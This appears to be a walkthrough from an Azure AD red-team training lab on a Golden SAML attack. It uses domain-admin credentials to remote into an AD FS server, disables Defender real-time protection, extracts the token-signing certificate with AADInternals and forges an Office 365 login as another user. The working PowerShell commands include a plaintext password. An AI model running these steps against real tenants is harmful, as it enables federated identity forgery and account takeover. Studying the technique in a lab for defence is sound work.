## Objective 26 ***Part of - Kill Chain - 4***

```
- Use the credentials for DA of deffin.com that you compromised earlier to extract tokensigning certificate from ADFS and access the deffin.com tenant as the user onpremuser.
```

- Compromised adfsadmin@deffin.com by compromising the deffin-approxy machine. Assuming that we know the IP of the AD FS server for deffin.com and the user actually has DA privileges (as many organizations setup ADFS role on the domain controller) try to access it using PSRemoting:
```powershell
$password = ConvertTo-SecureString 'UserToCreateandManageF3deration!' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('adfsadmin', $password)
$adfs = New-PSSession -ComputerName 172.16.4.41 -Credential $creds
Enter-PSSession $adcnct
```

- Copy AADInternals tool to the server and extract the token signing certificate:
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
exit
Copy-Item -ToSession $adfs -Path C:\AzAD\Tools\AADInternals.0.4.5.zip -Destination C:\Users\adfsadmin\Documents
Enter-PSSession $adfs
Expand-Archive C:\Users\adfsadmin\Documents\AADInternals.0.4.5.zip -DestinationPath C:\Users\adfsadmin\Documents\AADInternals
```
![test](/img/obj26a.png "Enumeration")

- Export the token signing certificate:
```powershell
Export-AADIntADFSSigningCertificate
```

- Get the ImmutableID of the user that we want to compromise. We can use Microsoft's ADModule for this. Run the below commands on the student VM:
```powershell
Import-Module C:\AzAD\Tools\ADModule\Microsoft.ActiveDirectory.Management.dll
Import-Module C:\AzAD\Tools\ADModule\ActiveDirectory\ActiveDirectory.psd1 PS C:\AzAD\Tools> [System.Convert]::ToBase64String((Get-ADUser -Identity onpremuser -Server 172.16.4.1 -Credential $creds | select -ExpandProperty ObjectGUID).tobytearray())
```
![test](/img/obj26b.png "Enumeration")

- Use the token signing certificate with the ImmutableID of onpremuser that we want to compromise:
```powershell
Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
```
![test](/img/obj26c.png "Enumeration")

- Copy the temporay html to the student VM and open it to login as the onpremuser user:
```powershell
ls C:\Users\adfsadmin\AppData\Local\Temp\*.tmp.html
exit
Copy-Item -FromSession $adfs -Path C:\Users\adfsadmin\AppData\Local\Temp\tmp9E0F.tmp.html -Destination C:\AzAD\Tools\
```
![test](/img/obj26d.png "Enumeration")


